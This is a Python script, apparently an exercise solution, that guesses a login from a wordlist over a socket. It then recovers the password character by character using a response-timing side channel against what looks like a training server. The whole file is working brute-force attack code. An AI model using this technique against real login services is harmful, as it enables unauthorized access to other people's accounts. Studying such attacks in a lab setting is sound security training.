import sys
import socket
import string
import json
import time


CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase


args = sys.argv
hostname = args[1]
port = int(args[2])

client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)


def find_pass():
    with open('logins.txt', 'r') as file:

        login = ""
        password = ""
        for line in file:
            login = line.rstrip("\n")
            data = {"login": login, "password": password}
            json_data = json.dumps(data, indent=4)

            data = json_data.encode()
            client_socket.send(data)
            response = client_socket.recv(1024)
            response = response.decode()
            if "Wrong login!" not in response:
                break

        # we know login
        while True:
            for char in CHARS:
                new_password = password + char

                data = {"login": login, "password": new_password}
                json_data = json.dumps(data, indent=4)
                data = json_data.encode()
                client_socket.send(data)
                start = time.time()
                response = client_socket.recv(1024)
                end = time.time()
                response = response.decode()
                if "Wrong password!" in response:
                    if end - start >= 0.09:
                        password = new_password
                        break
                    else:
                        continue
                elif "Connection success!" in response:
                    return json_data


result = find_pass()
client_socket.close()

if result:
    print(result)


# start = time.time()
# for i in range(100):
#     print("a")
#
# end = time.time()
# diff = end - start
# print(diff)
